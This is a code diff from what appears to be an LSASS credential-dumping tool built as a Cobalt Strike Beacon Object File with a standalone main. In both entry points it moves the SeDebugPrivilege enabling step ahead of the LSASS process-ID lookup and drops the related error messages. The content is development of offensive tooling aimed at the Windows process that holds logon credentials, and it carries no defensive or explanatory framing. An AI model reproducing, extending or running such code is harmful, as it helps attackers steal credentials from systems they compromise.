@@ -814,18 +814,22 @@ void go(char* args, int length)
     use_seclogon = (BOOL)BeaconDataInt(&parser);
     binary_path = BeaconDataExtract(&parser, NULL);
 
+    success = enable_debug_priv();
+    if (!success)
+    {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "Could not enable 'SeDebugPrivilege'"
+        );
+        return;
+    }
+
     // if not provided, get the PID of LSASS
     if (!pid)
     {
         pid = get_lsass_pid();
         if (!pid)
-        {
-            BeaconPrintf(
-                CALLBACK_ERROR,
-                "Failed to find the PID of LSASS.\n"
-            );
             return;
-        }
     }
 
     if (get_pid_and_leave)
@@ -852,16 +856,6 @@ void go(char* args, int length)
             &Version,
             &ImplementationVersion
         );
-    }
-
-    success = enable_debug_priv();
-    if (!success)
-    {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Could not enable 'SeDebugPrivilege'"
-        );
-        return;
     }
 
     /*
@@ -1159,17 +1153,21 @@ int main(int argc, char* argv[])
         }
     }
 
+    success = enable_debug_priv();
+    if (!success)
+    {
+        printf(
+            "Could not enable 'SeDebugPrivilege'\n"
+        );
+        return -1;
+    }
+
     // if not provided, get the PID of LSASS
     if (!pid)
     {
         pid = get_lsass_pid();
         if (!pid)
-        {
-            printf(
-                "Failed to find the PID of LSASS.\n"
-            );
             return -1;
-        }
     }
 
     if (get_pid_and_leave)
@@ -1217,15 +1215,6 @@ int main(int argc, char* argv[])
             &Version,
             &ImplementationVersion
         );
-    }
-
-    success = enable_debug_priv();
-    if (!success)
-    {
-        printf(
-            "Could not enable 'SeDebugPrivilege'\n"
-        );
-        return -1;
     }
 
     /*
